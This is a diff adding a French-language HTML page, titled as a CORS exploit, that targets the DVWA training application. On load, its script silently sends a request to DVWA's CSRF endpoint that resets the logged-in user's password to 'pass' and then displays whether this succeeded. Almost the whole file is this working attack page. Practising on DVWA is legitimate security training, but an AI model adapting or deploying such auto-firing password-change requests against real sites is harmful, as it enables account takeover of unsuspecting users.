@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit CORS DVWA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        #response {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        .success {
+            color: green;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Tester l'exploit CORS sur DVWA</h1>
+    <div id="response">
+        <p>La réponse apparaîtra ici...</p>
+    </div>
+
+    <script>
+        var password = 'pass';
+        window.onload = function() {
+            // Modifier l'URL par l'adresse correcte de votre DVWA
+            const url = '/DVWA/vulnerabilities/csrf/?password_new=' + password + '&password_conf='+ password + '&Change=Change';
+
+            // Créer une requête XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+
+            // Configurer la requête
+            xhr.open('GET', url, true);
+
+            // Définir ce qui se passe lorsque la requête est réussie
+            xhr.onload = function () {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    // Succès de la requête CORS
+                    document.getElementById('response').innerText = 'Requête CORS réussie! Le mot de passe est maintenant : ' + password;
+                    document.getElementById('response').classList.add('success');
+                } else {
+                    // Échec de la requête CORS
+                    document.getElementById('response').innerText = 'La requête CORS a échoué!';
+                    document.getElementById('response').classList.add('error');
+                }
+            };
+
+            // Gestionnaire d'événement d'erreur
+            xhr.onerror = function() {
+                // Échec de la requête CORS
+                document.getElementById('response').innerText = 'La requête CORS a échoué!';
+                document.getElementById('response').classList.add('error');
+            };
+
+            // Envoyer la requête
+            xhr.send();
+        };
+    </script>
+</body>
+</html>
